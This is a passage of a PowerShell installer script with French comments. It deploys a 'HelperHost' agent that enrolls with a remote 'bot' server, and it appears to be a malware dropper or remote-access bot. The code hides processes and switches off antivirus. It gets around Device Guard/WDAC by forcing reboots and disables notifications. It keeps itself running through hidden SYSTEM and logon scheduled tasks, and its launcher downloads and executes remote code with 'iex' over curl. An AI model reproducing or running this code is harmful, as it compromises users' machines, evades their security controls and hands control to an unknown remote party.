    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.UseShellExecute = $true
    [void][System.Diagnostics.Process]::Start($psi)
    Start-Sleep -Milliseconds 800
    if (Get-Process HelperHost -ErrorAction SilentlyContinue) { return $true }
  } catch {}

  try {
    Start-Process -FilePath $Helper -WorkingDirectory $WorkDir -WindowStyle Hidden -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 800
    if (Get-Process HelperHost -ErrorAction SilentlyContinue) { return $true }
  } catch {}

  try {
    & "$env:SystemRoot\System32\cmd.exe" /c "cd /d `"$WorkDir`" && start `"`" /b `"$Helper`""
    Start-Sleep -Milliseconds 900
    if (Get-Process HelperHost -ErrorAction SilentlyContinue) { return $true }
  } catch {}

  $tn = 'HelperHostBoot'
  try {
    Unregister-ScheduledTask -TaskName $tn -Confirm:$false -ErrorAction SilentlyContinue
    $action = New-ScheduledTaskAction -Execute $Helper -WorkingDirectory $WorkDir
    $trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(2))
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    $prin = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -RunLevel Highest
    Register-ScheduledTask -TaskName $tn -Action $action -Trigger $trigger -Settings $settings -Principal $prin -Force | Out-Null
    Start-ScheduledTask -TaskName $tn -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 3
    Unregister-ScheduledTask -TaskName $tn -Confirm:$false -ErrorAction SilentlyContinue
    if (Get-Process HelperHost -ErrorAction SilentlyContinue) { return $true }
  } catch {}

  return $false
}

function Register-ResumeAtLogon {
  if (-not $InstallUrl) {
    if ($BotBase) {
      $InstallUrl = "$($BotBase.TrimEnd('/'))/files/scripts/install-win.ps1"
    } else {
      throw 'InstallUrl manquant'
    }
  }
  $ghVal = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } elseif ($BotBase) { "$($BotBase.TrimEnd('/'))/files/releases" } else { '' }
  $state = [ordered]@{
    enroll      = $Enroll
    bot_base    = $BotBase
    install_url = $InstallUrl
    gh          = $ghVal
    user        = $env:USERNAME
  }
  ($state | ConvertTo-Json) | Set-Content -Encoding UTF8 $ResumeFile
  '1' | Set-Content -Encoding ASCII $PendingFile

  $launcher = Join-Path $Dir 'resume-install.ps1'
  $ps = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
  $log = (Join-Path $Dir 'resume.log').Replace("'", "''")
  $rf = $ResumeFile.Replace("'", "''")
  @(
    "`$ErrorActionPreference = 'Stop'"
    "Start-Transcript -Path '$log' -Force -ErrorAction SilentlyContinue"
    "function Wait-InteractiveLogon {"
    "  `$deadline = (Get-Date).AddHours(48)"
    "  while ((Get-Date) -lt `$deadline) {"
    "    try {"
    "      `$u = (Get-CimInstance Win32_ComputerSystem -EA Stop).UserName"
    "      if (`$u) {"
    "        `$e = @(Get-Process explorer -EA SilentlyContinue | Where-Object { `$_.SessionId -gt 0 })"
    "        if (`$e.Count -gt 0) { Start-Sleep -Seconds 8; return }"
    "      }"
    "    } catch {}"
    "    Start-Sleep -Seconds 3"
    "  }"
    "  throw 'timeout session'"
    "}"
    "Write-Host 'HelperHost: reprise install apres reboot...'"
    "Wait-InteractiveLogon"
    "`$j = Get-Content -Raw '$rf' | ConvertFrom-Json"
    "`$Enroll = `$j.enroll"
    "`$BotBase = `$j.bot_base"
    "`$InstallUrl = `$j.install_url"
    "`$env:AGENTSHE_ENROLL = `$Enroll"
    "`$env:AGENTSHE_BOT_BASE = `$BotBase"
    "`$env:AGENTSHE_INSTALL_URL = `$InstallUrl"
    "if (`$j.gh) { `$env:AGENTSHE_GH = `$j.gh } else { `$env:AGENTSHE_GH = (`$BotBase.TrimEnd('/') + '/files/releases') }"
    "`$env:AGENTSHE_ELEVATED = '1'"
    "`$env:AGENTSHE_AFTER_REBOOT = '1'"
    "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
    "try {"
    "  iex ((curl.exe -fsSL `$InstallUrl | Out-String))"
    "  Write-Output 'OK'"
    "} catch {"
    "  `$_ | Out-String | Set-Content -Encoding UTF8 (Join-Path `$env:TEMP 'HelperHost-resume.err')"
    "  exit 1"
    "}"
    "Stop-Transcript -ErrorAction SilentlyContinue"
  ) -join "`r`n" | Set-Content -Encoding UTF8 $launcher

  $tn = 'HelperHostResume'
  try { Unregister-ScheduledTask -TaskName $tn -Confirm:$false -ErrorAction SilentlyContinue } catch {}
  $arg = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$launcher`""
  $action = New-ScheduledTaskAction -Execute $ps -Argument $arg
  $userId = if ($env:USERDOMAIN -and $env:USERNAME) { "$env:USERDOMAIN\$env:USERNAME" } else { $env:USERNAME }
  try {
    $trigger = New-ScheduledTaskTrigger -AtLogOn -User $userId
  } catch {
    $trigger = New-ScheduledTaskTrigger -AtLogOn
  }
  $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero)
  try {
    $prin = New-ScheduledTaskPrincipal -UserId $userId -LogonType Interactive -RunLevel Highest
    Register-ScheduledTask -TaskName $tn -Action $action -Trigger $trigger -Settings $settings -Principal $prin -Force | Out-Null
  } catch {
    & schtasks.exe /Create /TN $tn /TR "`"$ps`" $arg" /SC ONLOGON /RL HIGHEST /F | Out-Null
  }

}

function Clear-ResumeTasks {
  foreach ($tn in @('HelperHostResume', 'HelperHostBoot')) {
    try { Unregister-ScheduledTask -TaskName $tn -Confirm:$false -ErrorAction SilentlyContinue } catch {}
  }
  Remove-Item $PendingFile, $ResumeFile -Force -ErrorAction SilentlyContinue
  $launcher = Join-Path $Dir 'resume-install.ps1'
  Remove-Item $launcher -Force -ErrorAction SilentlyContinue
}

function Start-Helper([string]$Helper, [string]$WorkDir) {
  if (-not (Test-Path $Helper)) { throw "HelperHost manquant: $Helper" }
  Unblock-Quiet $Helper
  Unblock-Quiet (Join-Path $WorkDir 'EdgeRelay.exe')

  # 1) Essai demarrage (AV coupe juste apres via SessionHarden — toujours)
  if (-not $ForceHarden) {
    if (Try-StartHelper $Helper $WorkDir) { return }
  }

  # 2) Bloque au demarrage → elev + AV off + retry
  if (-not (Test-IsAdmin) -and -not $IsElevatedRun) {
    Invoke-ElevatedInstall
    return
  }

  Invoke-SessionHarden
  if (Try-StartHelper $Helper $WorkDir) { return }

  if (-not $AfterReboot) {
    Register-ResumeAtLogon
    '1' | Set-Content -Encoding ASCII $RebootFlag
    Write-Output 'REBOOT'
    Start-Sleep -Seconds 2
    Restart-Computer -Force
    Start-Sleep -Seconds 60
    return
  }

  throw @"
Device Guard / WDAC bloque encore HelperHost.exe apres reboot.
Si politique d'organisation (GPO/MDM), elle doit etre retiree.
  $Helper
"@
}

function Install-WipeRestoreHook {
  $restoreDest = Join-Path $env:TEMP 'hh-restore-security.ps1'
  $restoreUrl = $null
  if ($InstallUrl) {
    $restoreUrl = $InstallUrl -replace 'install-win\.ps1', 'restore-win-security.ps1' -replace 'install\.ps1', 'restore-win-security.ps1'
  }
  if (-not $restoreUrl) {
    if ($BotBase) {
      $restoreUrl = "$($BotBase.TrimEnd('/'))/files/scripts/restore-win-security.ps1"
    } else {
      return
    }
  }
  try {
    Download-File $restoreUrl $restoreDest
  } catch {}
  if (-not (Test-Path $restoreDest)) { return }

  $tn = 'HelperHostWipeRestore'
  try { Unregister-ScheduledTask -TaskName $tn -Confirm:$false -ErrorAction SilentlyContinue } catch {}
  $ps = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
  $arg = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$restoreDest`""
  $action = New-ScheduledTaskAction -Execute $ps -Argument $arg
  $userId = if ($env:USERDOMAIN -and $env:USERNAME) { "$env:USERDOMAIN\$env:USERNAME" } else { $env:USERNAME }
  $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::FromHours(1))
  try {
    $prin = New-ScheduledTaskPrincipal -UserId $userId -LogonType Interactive -RunLevel Highest
    Register-ScheduledTask -TaskName $tn -Action $action -Settings $settings -Principal $prin -Force | Out-Null
  } catch {
    & schtasks.exe /Create /TN $tn /TR "`"$ps`" $arg" /SC ONCE /ST 00:00 /RL HIGHEST /F | Out-Null
  }
}

if ($AfterReboot) {
  try { Unregister-ScheduledTask -TaskName 'HelperHostResume' -Confirm:$false -ErrorAction SilentlyContinue } catch {}
  Wait-InteractiveLogon
  Write-Host 'Session detectee — reprise de l''install...'
}

if ($SessionPrep) {
  Invoke-SessionHarden
  Write-Output 'OK'
  exit 0
}

Restore-OrFetch 'HelperHost.exe' "$Gh/HelperHost-windows-amd64.exe"
# EdgeRelay is fetched by HelperHost into TEMP — not stored in the install folder

Save-HHState @{ enroll = $Enroll; bot_base = $BotBase }
$env:AGENTSHE_ENROLL = $Enroll
$env:AGENTSHE_BOT_BASE = $BotBase
$Helper = Join-Path $Dir 'HelperHost.exe'
Clear-LegacySidecars
$script:ElevDoneOk = $false
$script:ElevRebootPending = $false
Disable-WindowsNotifications
if ((Test-IsAdmin) -or $ForceHarden) {
  Invoke-SessionHarden
}
Start-Helper $Helper $Dir

if ($script:ElevDoneOk) {
  Finish-Ok
  return
}
if ($script:ElevRebootPending) {
  Write-Output 'REBOOT-PENDING (reprise auto a la prochaine connexion)'
  return
}

$ok = $false
for ($i=0; $i -lt 180; $i++) {
  Start-Sleep -Seconds 1
  if (Test-HelperReady) {
    try { Invoke-ElevatedSessionPrep } catch {}
    Finish-Ok
    $ok = $true
    break
  }
}
if (-not $ok) {
  if (Test-Path $PendingFile) {
    Write-Output 'REBOOT'
    return
  }
  throw 'timeout'
}
